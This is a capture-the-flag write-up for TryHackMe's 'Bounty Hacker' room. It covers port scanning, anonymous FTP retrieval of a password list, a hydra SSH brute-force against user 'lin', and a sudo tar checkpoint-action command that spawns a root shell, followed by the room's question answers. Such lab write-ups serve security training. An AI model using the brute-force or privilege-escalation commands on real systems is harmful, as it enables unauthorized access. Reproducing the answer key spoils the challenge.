# [THM] - Bounty Hacker

[Room link](https://tryhackme.com/room/cowboyhacker)

---

## Enumeration

Nmap :

```bash
$ sudo nmap -sS -oN <file> <target_ip>
[...]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

---

### FTP 

The ftp service as anonymous is allowed. First, we need to turn off the passive mode. After that, we can download the files.

```bash
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*****************************************|   418        4.27 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.19 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*****************************************|    68        0.75 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.56 KiB/s)
```

This files are really interesting. 

task.txt is signed by "lin". Probably an user.

locks.txt contains some strings which looks like examples of passwords. 

---

## Exploitation

Let's try to bruteforce the ssh with hydra.

```bash
$ hydra -l lin -P locks.txt <target_ip> ssh
[...] 
[DATA] attacking ssh://10.10.198.158:22/
[22][ssh] host: 10.10.198.158   login: lin   password: **********
```

That works.

Let's connect us to the target throught ssh.

```bash
Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```

We are in.

---

## Flag user

The user flag is here -> /home/lin/Desktop/user.txt

---

## Flag root

Check the commands available with this follow command :

```bash
$ sudo -l 
[...]
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Use this command to get a shell as root :

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
nt-action=exec=/bin/sh
tar: Removing leading `/' from member names
# 
# ls -l
total 4
-rw-r--r-- 1 root root 19 Jun  7  2020 root.txt
```

The root flag is here -> /root/root.txt

---

## Question Section

1. Deploy the machine.

**No aswer needed**

2. Find open ports on the machine

**No aswer needed**

3. Who wrote the task list? 

**lin**

4. What service can you bruteforce with the text file found?

**ssh**

5. What is the users password? 

**Run bruteforce of the ssh service with the user "lin" and password file locks.txt**

6. user.txt

**/home/lin/Desktop/user.txt**

7. root.txt 

**/root/root.txt**

